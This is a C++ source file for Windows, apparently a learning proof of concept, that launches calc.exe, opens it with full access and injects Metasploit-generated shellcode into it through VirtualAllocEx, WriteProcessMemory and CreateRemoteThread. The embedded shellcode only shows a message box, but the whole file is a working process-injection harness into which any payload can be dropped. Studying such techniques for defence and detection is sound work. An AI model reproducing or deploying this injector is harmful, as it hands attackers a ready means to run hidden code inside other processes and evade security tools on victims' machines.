#include <windows.h> // needed for windows API)
#include <tlhelp32.h> // for CreateToolhelp32Snapshot
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>    // sort
#include <utility> //pair
#include <thread>
#include <stdio.h>
using namespace std;


//msfvenom - p windows / x64 / messagebox TEXT = "Thai dang uong bia"  TITLE = "Warning" EXITFUNC = thread - f c - v shellcode
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
"\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x54\x68\x61\x69\x20"
"\x64\x61\x6e\x67\x20\x75\x6f\x6e\x67\x20\x62\x69\x61\x00\x57"
"\x61\x72\x6e\x69\x6e\x67\x00";


DWORD getPID(string process_name) {
	HANDLE hProcessSnap; //create handle identifier for object hprocesssnap
	HANDLE hProcess; //create handle identifier for object hprocess
	PROCESSENTRY32 pe32; //Describes an entry from a list of the processes residing in the system address space when a snapshot was taken.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //take "snapshot" of processes running
	pe32.dwSize = sizeof(PROCESSENTRY32); //size of PROCESSENTRY32 [unused]
	while (Process32Next(hProcessSnap, &pe32)) {
		//char to string
		wstring ws(pe32.szExeFile);
		string name(ws.begin(), ws.end());
		if (process_name == name) {
			cout << pe32.th32ProcessID << " - " << name << endl;
			return pe32.th32ProcessID;
		}
	};
	return 0;
}

void injectCodeToProcess(DWORD pid) {
	
	HANDLE process_handle;
	LPVOID pointer_after_allocated;
	//Open process for handle
	process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (process_handle == NULL)
		puts("[-] Error while open the process\n");
	else
		puts("[+] Process Opened sucessfully\n");

	//address to write
	pointer_after_allocated = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pointer_after_allocated == NULL) 
		puts("[-] Error while get the base address to write\n");
	else 
		printf("[+] Got the address to write 0x%x\n", pointer_after_allocated);
	//write shellcode
	if (WriteProcessMemory(process_handle, pointer_after_allocated, shellcode, sizeof(shellcode), 0)) {
		puts("[+] Injected\n");
		puts("[+] Running the shellcode as new thread !\n");
		CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0);
	}
	else {
		puts("Not Injected\n");
	}
}

int main()
{
	//open calc.exe
	string process_name = "calc.exe";
	thread task(system, process_name.c_str());
	task.detach();
	//get pid
	DWORD pid = 0;
	while (pid == 0) {
		pid = getPID("calc.exe");
	}
	injectCodeToProcess(pid);
    system("pause");
    return 0;
}